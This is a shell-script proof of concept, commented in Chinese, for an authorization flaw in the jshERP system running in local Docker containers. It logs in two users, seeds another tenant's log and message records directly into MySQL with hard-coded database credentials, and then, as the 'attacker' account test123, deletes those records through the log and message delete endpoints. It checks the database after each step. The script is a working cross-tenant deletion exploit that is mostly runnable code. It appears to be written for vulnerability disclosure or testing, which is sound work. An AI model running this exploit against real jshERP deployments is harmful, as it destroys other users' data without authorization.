#!/bin/sh
set -e
BASE='http://127.0.0.1:9999/jshERP-boot'
STAMP=$(date +%s)
LOG_MARK="poc-log-owner-63-$STAMP"
MSG_MARK="poc-msg-owner-63-$STAMP"

step() {
  echo
  echo "=============================="
  echo "[STEP] $1"
  echo "=============================="
}

run() {
  echo "+ $1"
  sh -c "$1"
}

login_token() {
  user="$1"
  docker exec jsherp33-app sh -lc "curl -s -X POST $BASE/user/login -H 'Content-Type: application/json' -d '{\"loginName\":\"$user\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'" \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
}

step "1) 登录获取 token（jsh 与 test123）"
TOKEN_TEST="$(login_token test123)"
TOKEN_JSH="$(login_token jsh)"
echo "jsh token: $TOKEN_JSH"
echo "test123 token: $TOKEN_TEST"

step "2) 查看当前数据库基线（删除前）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\\\"\""

step "3) 构造受害者数据（user_id=63, tenant_id=63）"
run "docker exec jsherp33-mysql sh -lc \"mysql -ujsherp -p123456 -D jsh_erp -e \\\"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'POC_LOG','127.0.0.1',NOW(),0,'$LOG_MARK',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('$MSG_MARK','poc',NOW(),'系统',63,'1',63,'0');\\\"\""

LOG_ID=$(docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id FROM jsh_log WHERE content='$LOG_MARK' ORDER BY id DESC LIMIT 1;\"" | tail -n 1)
MSG_ID=$(docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id FROM jsh_msg WHERE msg_title='$MSG_MARK' ORDER BY id DESC LIMIT 1;\"" | tail -n 1)
echo "Seeded LOG_ID=$LOG_ID, MSG_ID=$MSG_ID"

step "4) 查看受害者数据（确认属于 jsh）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=$LOG_ID; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=$MSG_ID;\\\"\""

step "5) 攻击者 test123 删除 jsh 的日志"
run "docker exec jsherp33-app sh -lc \"curl -s -X DELETE '$BASE/log/delete?id=$LOG_ID' -H 'X-Access-Token: $TOKEN_TEST'\""
echo "[DB 状态] 删除日志后检查"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=$LOG_ID;\\\"\""

step "6) 攻击者 test123 删除 jsh 的消息"
run "docker exec jsherp33-app sh -lc \"curl -s -X DELETE '$BASE/msg/delete?id=$MSG_ID' -H 'X-Access-Token: $TOKEN_TEST'\""
echo "[DB 状态] 删除消息后检查"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=$MSG_ID;\\\"\""

step "7) 最终数据库状态汇总"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\\\"\""

echo
echo "[Context]"
echo "jsh token: $TOKEN_JSH"
echo "test123 token: $TOKEN_TEST"
